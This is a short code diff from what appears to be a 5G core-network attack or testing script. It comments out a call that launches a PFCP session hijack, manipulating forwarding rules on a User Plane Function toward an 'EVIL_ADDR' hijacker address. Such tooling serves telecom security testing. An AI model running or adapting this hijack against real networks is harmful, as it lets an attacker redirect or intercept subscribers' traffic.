@@ -236,12 +236,12 @@ NET_IFACE= "eth0"
 
 
 
-PFCPHijack_obj = PFCPHijack()
-PFCPHijack_obj.set_verbose(True)
-PFCPHijack_obj.Start_PFCP_hijack_far_manipulation(
-    hijacker_addr=EVIL_ADDR,
-    upf_addr=UPF_ADDR,
-    src_port=SRC_PORT,
-    dest_port=DEST_PORT,
-    seid=1
-)
+# PFCPHijack_obj = PFCPHijack()
+# PFCPHijack_obj.set_verbose(True)
+# PFCPHijack_obj.Start_PFCP_hijack_far_manipulation(
+#     hijacker_addr=EVIL_ADDR,
+#     upf_addr=UPF_ADDR,
+#     src_port=SRC_PORT,
+#     dest_port=DEST_PORT,
+#     seid=1
+# )
